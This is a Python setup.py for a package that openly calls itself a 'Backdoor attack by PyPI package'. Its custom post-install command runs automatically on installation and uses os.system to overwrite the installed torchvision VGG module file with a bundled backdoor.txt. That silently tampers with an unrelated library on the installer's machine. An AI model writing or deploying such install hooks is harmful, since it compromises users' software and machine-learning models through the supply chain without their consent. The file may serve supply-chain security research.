from setuptools import setup
from setuptools import find_packages
from setuptools.command.install import install



class PostInstallCommand(install):
    """Post-installation for installation mode."""
    def run(self):
        install.run(self)
        import os
        from torchvision.models import vgg
        path = vgg.__file__
        os.system(f'cp ./src/backdoor_ww/backdoor.txt {path}')


VERSION = '0.1.7'


setup(
    name='backdoor_ww',  # package name
    version=VERSION,  # package version
    description='Backdoor attack by PyPI package',  # package description
    packages=find_packages("src"),
    package_dir={"": "src"},
    include_package_data=True,
    package_data={"backdoor_ww":["*.txt"]},
    cmdclass={
        'install': PostInstallCommand,
    },
    zip_safe=False,
)
